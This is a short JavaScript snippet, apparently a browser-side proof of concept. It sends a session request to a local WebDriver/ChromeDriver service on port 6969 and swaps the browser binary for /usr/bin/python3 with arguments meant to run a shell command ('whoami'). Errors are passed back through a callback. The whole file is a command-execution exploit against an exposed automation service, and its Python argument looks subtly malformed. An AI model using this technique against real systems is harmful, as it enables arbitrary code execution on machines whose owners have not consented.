const [callback] = arguments;

const snapshot = (thedata) => callback(thedata);

try {
    fetch('http://localhost:6969/session', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            capabilities: {
            alwaysMatch: {
                "goog:chromeOptions": {
                "binary": "/usr/bin/python3",
                    "args":["-cimport(\"os\").system(\"whoami\")"]
                }
            }
            }
        })
        })
        .then(response => response.json())
        .then(data => console.log(data))
        .catch(error => {
            console.error("Error fetching the data:", error);
            snapshot(error.message);
        });
} catch (error) {
    console.error("Error processing the data:", error);
    snapshot(error.message);
}